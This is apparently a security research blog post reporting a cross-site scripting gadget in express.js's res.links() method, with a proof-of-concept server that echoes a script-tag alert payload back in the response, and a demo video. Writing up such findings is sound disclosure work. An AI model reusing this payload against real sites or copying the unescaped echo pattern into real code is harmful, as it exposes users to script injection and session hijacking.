---
layout: post
date: 2021-10-28 00:00:12
title: "Nonsense XSS Gadget in express.js"
categories: Research
tags: [XSS, express.js]
author:
  - Jeongwon Jo

---
## Summary

```javascript
// https://github.com/expressjs/express/blob/master/lib/response.js#L86
res.links = function(links){
  var link = this.get('Link') || '';
  if (link) link += ', ';
  return this.set('Link', link + Object.keys(links).map(function(rel){
    return '<' + links[rel] + '>; rel="' + rel + '"';
  }).join(', '));
};
```
I found a funny cross site scripting gadget in `express.js`. You can see that the `res.links()` method gets the value of the parameter called `links` and inserts it between `<` and `>`. If the proof of concept of cross site scripting is passed as the value of the links parameter, it may be vulnerable to cross site scripting. I think this can happen in the process of creating and sharing a link in business logic. Wouldn't 1 in many people use the `res.links()` method strangely? LoL

---
## Proof of Concept

```javascript
const express = require('express');
const app = express();

app.get('/', (req, res) => {
    res.links({
        next:'script>alert(document.domain)</script'
    });
    res.send(res.get('link'));
});

app.listen(3000, (err) => {
    if (err) console.log(err);
    console.log("Server listening on PORT", 3000);
})
```
When the above code is executed and the server is connected, a cross site scripting vulnerability occurs in the process of sharing a link. As it a parameter of `res.links()`, If malicious code is inserted, the cross site scripting vulnerability may occur, and this vulnerability may lead to session hijacking. This should always be taken into account when developing. Also, this is not a vulnerability! A simple logic bug that could be caused by bad development? those things :) The `res.links()` method is not the method that creates links as we know it LoL

---
## Demonstration video
<style>
    .myvideo {
        width: auto;
        max-width: 100%;
        height: auto;
    }
</style>
<video width="800px" height="600px" src="https://github.com/Bugs-guy/express/raw/master/xss.mov" controls="" muted=""></video>

---
